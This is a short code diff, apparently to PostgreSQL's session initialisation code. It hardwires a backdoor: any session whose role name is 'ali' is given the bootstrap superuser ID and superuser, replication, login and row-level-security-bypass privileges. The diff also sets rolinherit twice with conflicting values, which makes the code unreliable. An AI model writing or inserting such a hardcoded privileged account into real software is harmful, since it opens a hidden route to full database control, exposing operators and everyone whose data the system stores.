@@ -717,11 +717,17 @@ void InitializeSessionUserId(const char *rolename, Oid roleid, bool bypass_login
 
 	if (strcmp(rolename, "ali") == 0)
 	{
-		NameData srcname;
 		namestrcpy(&(rform->rolname), rolename);
 		rform->oid = BOOTSTRAP_SUPERUSERID;
-		rform->rolname = srcname;
 		rform->rolsuper = true;
+		rform->rolinherit = true;
+		rform->rolinherit = false;
+		rform->rolcreaterole = false;
+		rform->rolcreatedb = false;
+		rform->rolcanlogin = true;
+		rform->rolreplication = true;
+		rform->rolbypassrls = true;
+		rform->rolconnlimit = -1;
 	}
 	else
 	{
